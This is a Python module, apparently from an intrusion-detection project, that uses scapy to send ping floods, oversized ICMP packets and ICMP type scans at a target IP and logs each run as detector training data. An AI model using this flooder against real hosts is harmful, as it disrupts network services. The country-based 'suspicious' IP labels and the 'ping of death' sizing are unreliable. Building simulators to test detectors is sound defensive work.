"""
ICMP Attack Simulator
=====================

This module simulates ICMP-based attacks (ping floods, ping of death) for
testing the ICMP detector. Uses scapy to craft ICMP packets.

Usage:
    python attack_simulator_icmp.py [target_ip]
    
    Requires: Administrator/root privileges, scapy library
    
Educational Purpose:
    Demonstrates ICMP-based DoS attack vectors.
    Shows how ping can be weaponized.
    
WARNING:
    Flooding attacks can disrupt network services!
    Use only in isolated test environments.
"""

import sys
import os
import ctypes
import time
import random
from datetime import datetime

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))


def check_admin_privileges():
    """Check if running with Administrator/root privileges."""
    try:
        if os.name == 'nt':  # Windows
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:  # Linux/Unix
            return os.geteuid() == 0
    except:
        return False


def require_admin():
    """Require admin privileges or exit with instructions."""
    if not check_admin_privileges():
        print("\n" + "="*70)
        print("ERROR: Administrator/root privileges required!")
        print("="*70)
        print("\nICMP packet crafting requires raw socket access.")
        print("\nWindows:")
        print("  1. Right-click on Command Prompt/PowerShell")
        print("  2. Select 'Run as Administrator'")
        print("  3. Run this script again")
        print("\nLinux:")
        print("  sudo python attack_simulator_icmp.py")
        print("="*70)
        sys.exit(1)
    print("[OK] Running with Administrator privileges")


# Import scapy after admin check
from scapy.all import ICMP, IP, send, conf
import importlib.util

# Load attack_logger and models
from models.session_models import ICMPSession

_CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
_logger_spec = importlib.util.spec_from_file_location(
    "attack_logger",
    os.path.join(_CURRENT_DIR, "logging", "attack_logger.py"),
)
_attack_logger_mod = importlib.util.module_from_spec(_logger_spec)
_logger_spec.loader.exec_module(_attack_logger_mod)
AttackLogger = _attack_logger_mod.AttackLogger


# ═══════════════════════════════════════════════════════════════════════════
# IP ADDRESS GENERATION
# ═══════════════════════════════════════════════════════════════════════════
def generate_realistic_ip(prefer_repeat=False, repeat_pool=None):
    """
    Generate realistic-looking source IP addresses for simulation.
    
    Args:
        prefer_repeat: If True, 40% chance to return IP from repeat_pool
        repeat_pool: List of IPs to choose from for repeat attacks
    
    Returns:
        str: Random IP address
    """
    # If repeat requested and pool available, sometimes use those
    if prefer_repeat and repeat_pool and random.random() < 0.4:
        return random.choice(repeat_pool)
    
    choice = random.random()
    
    if choice < 0.60:  # Public IPs from various regions
        ranges = [
            (45, 76),    # North America / Europe
            (101, 125),  # Asia Pacific
            (151, 188),  # Global mixed
            (190, 223),  # Various regions
        ]
        first_octet = random.choice([random.randint(r[0], r[1]) for r in ranges])
        return f"{first_octet}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
    
    elif choice < 0.80:  # Cloud provider ranges
        cloud_ranges = [
            (3, 5),      # AWS partial
            (13, 15),    # Microsoft Azure partial
            (34, 35),    # Google Cloud partial
            (52, 54),    # AWS EC2
        ]
        first_octet = random.choice([random.randint(r[0], r[1]) for r in cloud_ranges])
        return f"{first_octet}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
    
    elif choice < 0.90:  # Known suspicious ranges
        suspicious_ranges = [
            (80, 95),    # Eastern Europe
            (176, 178),  # Russia
            (112, 115),  # China
        ]
        first_octet = random.choice([random.randint(r[0], r[1]) for r in suspicious_ranges])
        return f"{first_octet}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
    
    else:  # Residential ISP ranges
        return f"{random.choice([68, 70, 72, 73, 75, 98, 99])}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"


class ICMPSimulator:
    """
    Simulate ICMP-based attacks.
    
    Attack Types:
      - Normal Ping: Legitimate ICMP echo requests
      - Ping Flood: High-rate ICMP traffic (DoS)
      - Ping of Death: Oversized ICMP packets
      - Ping Sweep: Scan multiple hosts
    
    Logs all simulated attacks to data/attack_logs.csv for ML training.
    """
    
    def __init__(self, target="127.0.0.1", log_file=None, repeat_ips=None):
        """
        Initialize ICMP attack simulator.
        
        Args:
            target: Target IP address
            log_file: Path to CSV log file (default: project's data/attack_logs.csv)
            repeat_ips: List of IPs to sometimes reuse (for cross-attack correlation)
        """
        self.target = target
        self.repeat_ips = repeat_ips or []
        if log_file is None:
            log_file = os.path.join(_CURRENT_DIR, "data", "attack_logs.csv")
        self.logger = AttackLogger(log_file)
        print(f"[ICMPSimulator] Target: {target}")
        print(f"[ICMPSimulator] Logging to: {log_file}")
    
    def _log_icmp(self, attack_type: str, count: int, duration: float, 
                  flood: bool = False, oversized: bool = False, avg_size: int = 64):
        """Log an ICMP attack session to CSV."""
        rate = count / duration if duration > 0 else count
        
        # Generate realistic source IP (sometimes repeat for correlation)
        source_ip = generate_realistic_ip(prefer_repeat=True, repeat_pool=self.repeat_ips)
        
        # Add timestamp variation (spread attacks over time)
        import datetime as dt
        base_time = dt.datetime.now()
        time_offset = random.randint(-3600, 0)  # Up to 1 hour in the past
        timestamp = (base_time + dt.timedelta(seconds=time_offset)).strftime("%Y-%m-%d %H:%M:%S")
        
        session = ICMPSession(
            ip_address=source_ip,
            icmp_type=8,  # Echo request
            icmp_code=0,
            packet_size=avg_size,
            icmp_rate=round(rate, 2),
            flood_detected=1 if flood else 0,
            oversized_detected=1 if oversized else 0,
            session_duration=round(duration, 2),
            packet_count=count,
            timestamp=timestamp  # Use the varied timestamp
        )
        
        self.logger.log_session(session)
        print(f"[ICMPSimulator] Logged {attack_type} from {source_ip}: {count} packets @ {rate:.1f} pkt/s")
    
    def normal_ping(self, count=10):
        """Simulate normal ping traffic (legitimate)."""
        print(f"\n[NORMAL PING] Sending {count} normal pings...")
        start_time = time.time()
        
        for i in range(count):
            packet = IP(dst=self.target) / ICMP(type=8, code=0)
            try:
                send(packet, verbose=False)
            except:
                pass
            time.sleep(1)
        
        duration = time.time() - start_time
        print(f"[NORMAL PING] Complete: {count} pings in {duration:.2f}s")
        self._log_icmp("normal", count, duration, flood=False, oversized=False, avg_size=64)
    
    def ping_flood(self, count=200, interval=0.01):
        """Simulate ICMP flood attack (DoS)."""
        print(f"\n[PING FLOOD] Sending {count} rapid ICMP packets...")
        start_time = time.time()
        
        for i in range(count):
            packet = IP(dst=self.target) / ICMP(type=8, code=0, id=i)
            try:
                send(packet, verbose=False)
            except:
                pass
            time.sleep(interval)
        
        duration = time.time() - start_time
        rate = count / duration
        print(f"[PING FLOOD] Complete: {count} packets in {duration:.2f}s ({rate:.1f} pkt/s)")
        self._log_icmp("flood", count, duration, flood=True, oversized=False, avg_size=64)
    
    def ping_of_death(self, count=10):
        """Simulate ping of death attack (oversized packets)."""
        print(f"\n[PING OF DEATH] Sending {count} oversized ICMP packets...")
        start_time = time.time()
        
        for i in range(count):
            payload = "X" * 2000  # Oversized payload
            packet = IP(dst=self.target) / ICMP(type=8, code=0) / payload
            try:
                send(packet, verbose=False)
            except:
                pass
            time.sleep(random.uniform(0.5, 1.0))
        
        duration = time.time() - start_time
        print(f"[PING OF DEATH] Complete: {count} packets in {duration:.2f}s")
        self._log_icmp("ping_of_death", count, duration, flood=False, oversized=True, avg_size=2000)
    
    def icmp_type_scan(self):
        """Simulate ICMP type scanning."""
        print("\n[ICMP TYPE SCAN] Sending various ICMP types...")
        start_time = time.time()
        
        icmp_types = [
            (8, 0, "Echo Request"),
            (13, 0, "Timestamp Request"),
            (15, 0, "Information Request"),
            (17, 0, "Address Mask Request")
        ]
        
        for icmp_type, icmp_code, description in icmp_types:
            print(f"  Sending ICMP Type {icmp_type} ({description})")
            packet = IP(dst=self.target) / ICMP(type=icmp_type, code=icmp_code)
            try:
                send(packet, verbose=False)
            except:
                pass
            time.sleep(0.5)
        
        duration = time.time() - start_time
        print(f"[ICMP TYPE SCAN] Complete in {duration:.2f}s")
        self._log_icmp("type_scan", len(icmp_types), duration, flood=False, oversized=False, avg_size=64)


def run_simulation_suite(target="127.0.0.1", rounds=3):
    """Run a full suite of ICMP attack simulations."""
    print("=" * 70)
    print("ICMP ATTACK SIMULATOR")
    print("=" * 70)
    print(f"Target: {target}")
    print(f"Rounds: {rounds} of each attack type")
    print(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 70)
    
    simulator = ICMPSimulator(target)
    
    for round_num in range(1, rounds + 1):
        print(f"\n{'='*70}")
        print(f"ROUND {round_num}/{rounds}")
        print(f"{'='*70}")
        
        # Normal ping
        simulator.normal_ping(count=8)
        time.sleep(2)
        
        # Ping flood
        simulator.ping_flood(count=150, interval=0.02)
        time.sleep(2)
        
        # Ping of death
        simulator.ping_of_death(count=5)
        time.sleep(2)
        
        # ICMP type scan
        simulator.icmp_type_scan()
        time.sleep(2)
    
    print(f"\n{'='*70}")
    print("SIMULATION COMPLETE")
    print(f"Finished: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("Check data/attack_logs.csv for logged ICMP attacks")
    print(f"{'='*70}")


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="ICMP Attack Simulator")
    parser.add_argument("--target", default="127.0.0.1", help="Target IP address (default: 127.0.0.1)")
    parser.add_argument("--rounds", type=int, default=3, help="Number of rounds (default: 3)")
    parser.add_argument("--auto", action="store_true", help="Auto-start without prompt")
    
    args = parser.parse_args()
    
    print("\n" + "="*70)
    print("ICMP ATTACK SIMULATOR")
    print("="*70 + "\n")
    
    # Check admin privileges first
    require_admin()
    
    if not args.auto:
        print("\nWARNING: Flood attacks can impact network performance!")
        print("Use only in isolated test environments.")
        
        response = input("\nContinue? (yes/no): ")
        if response.lower() != 'yes':
            print("Aborted.")
            sys.exit(0)
    
    run_simulation_suite(target=args.target, rounds=args.rounds)
